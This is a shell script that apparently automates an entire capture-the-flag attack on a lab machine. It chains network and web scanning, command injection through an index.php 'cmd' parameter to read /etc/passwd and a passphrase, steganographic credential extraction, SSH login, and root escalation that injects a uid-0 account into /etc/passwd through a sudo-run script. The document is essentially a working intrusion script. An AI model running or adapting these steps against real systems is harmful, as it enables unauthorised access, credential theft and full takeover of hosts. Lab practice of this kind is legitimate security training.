#/bin/sh

# Retrieve absolute path to this script
script=$(readlink -f $0)
scriptpath=`dirname $script`

# Define target IP ( the machine to attack ) and attack IP ( the machine which supports the attack )
target_ip="10.10.83.106"
attack_ip="10.9.5.12"
result_folder="/work/results/"

# Prepare environment
mkdir $result_folder 2>/dev/null

echo "1 - RECONNAISSANCE"
nmap -p- -Pn -sC -sV -A -sS -T5 ${target_ip} > $result_folder/nmap-results.txt

echo "2 - ANALYZE WEBSITE"
gobuster dir -u http://$target_ip -t 200 -x php,sh,txt,cgi,jpg,png,html,js,css,py -w /usr/share/seclists/Discovery/Web-Content/directory-list-1.0.txt -o $result_folder/directories.txt
gobuster dir -u http://$target_ip/assets -t 200 -x php,sh,txt,cgi,jpg,png,html,js,css,py -w /usr/share/seclists/Discovery/Web-Content/directory-list-1.0.txt >> $result_folder/directories.txt
gobuster dir -u http://$target_ip/assets/images -t 200 -x jpg,png -w /usr/share/seclists/Discovery/Web-Content/directory-list-1.0.txt >> $result_folder/directories.txt
ffuf -w /usr/share/seclists/Discovery/Web-Content/api/objects.txt -u http://$target_ip/assets/index.php?FUZZ=id -t 200 -o $result_folder/parameters.txt -fs 0

curl -s -X GET http://$target_ip/assets/index.php?cmd=cat+/etc/passwd -o $result_folder/etc-passwd.txt
base64 -d $result_folder/etc-passwd.txt | tee "$result_folder/etc-passwd.txt" > /dev/null
USERNAME=$(cat $result_folder/etc-passwd.txt | grep 1000:1000 | head -n 1 | sed -n 's/.*\/home\/\(.*\):\/bin.*/\1/p')
echo "--> User is '$USERNAME'"

curl -s -X GET http://$target_ip/assets/index.php?cmd=cat+/var/www/Hidden_Content/passphrase.txt -o $result_folder/passphrase.txt
base64 -d $result_folder/passphrase.txt | tee "$result_folder/passphrase.txt" > /dev/null
base64 -d $result_folder/passphrase.txt | tee "$result_folder/passphrase.txt" > /dev/null
curl -s -X GET http://$target_ip/assets/images/oneforall.jpg -o $result_folder/oneforall.jpg
tail -c +21 $result_folder/oneforall.jpg > $result_folder/temp
printf "\xff\xd8" | cat - $result_folder/temp > $result_folder/oneforall-real.jpg && rm $result_folder/temp
STEGPASSWORD=$(cat $result_folder/passphrase.txt)
steghide --extract -f -p $STEGPASSWORD -sf $result_folder/oneforall-real.jpg -xf $result_folder/credentials.txt > /dev/null 2> /dev/null 

echo "3 - INTRUSION"
PASSWORD=$(tail -1 $result_folder/credentials.txt | sed -n "s/.*:\(.*\)/\1/p")
echo "--> Password is '$PASSWORD'"
sshpass -p ${PASSWORD} scp -o StrictHostKeyChecking=no ${USERNAME}@${target_ip}:user.txt $result_folder/user.txt
USER_FLAG=$(cat $result_folder/user.txt)
echo "--> User flag is '$USER_FLAG"

echo "4 - PRIVILEGE ESCALATION"
sshpass -p ${PASSWORD} scp -o StrictHostKeyChecking=no $scriptpath/../../tools/LinEnum.sh $USERNAME@$target_ip:/home/$USERNAME/LinEnum.sh
sshpass -p ${PASSWORD} ssh -o StrictHostKeyChecking=no $USERNAME@$target_ip "chmod +x /home/$USERNAME/LinEnum.sh"
sshpass -p ${PASSWORD} ssh -o StrictHostKeyChecking=no $USERNAME@$target_ip "/home/$USERNAME/LinEnum.sh" > $result_folder/linenum.txt

TEMP_PASSWORD=$(echo "123" | mkpasswd --stdin -m md5crypt -s)
echo "--> We will use '$TEMP_PASSWORD' for new root account"
ESCAPED_PASSWORD=$(echo $TEMP_PASSWORD | sed 's/\$/\\$/g')
sshpass -p ${PASSWORD} ssh -o StrictHostKeyChecking=no $USERNAME@$target_ip "printf '$PASSWORD\n'\"'\"me:$ESCAPED_PASSWORD:0:0:me:/root:/bin/bash\"'\"'>> /etc/passwd' | sudo -S /opt/NewComponent/feedback.sh"

echo "--> Enter 123 when asked for password"
sshpass -p ${PASSWORD} ssh -o StrictHostKeyChecking=no $USERNAME@$target_ip "su - me -c 'sudo cat /root/root.txt'"


